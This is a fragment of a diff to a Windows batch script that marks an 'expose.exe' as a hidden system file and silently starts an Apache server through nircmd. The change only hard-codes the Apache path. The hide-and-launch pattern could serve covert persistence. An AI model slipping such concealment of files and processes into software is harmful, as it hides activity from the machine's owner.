@@ -30,9 +30,9 @@ if not errorlevel 1 (attrib +s +h +i "%environment%\expose.exe") else (attrib -s
 )
 )
 
-if exist "%environment%\apache2\bin\httpd.exe" (
+if exist "C:\apache2\bin\httpd.exe" (
 tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
-if not errorlevel 1 (echo.) else ("%environment%\nircmd.exe" exec hide "%environment%\apache2\bin\httpd.exe"
+if not errorlevel 1 (echo.) else ("%environment%\nircmd.exe" exec hide "C:\apache2\bin\httpd.exe"
 )
 )
 
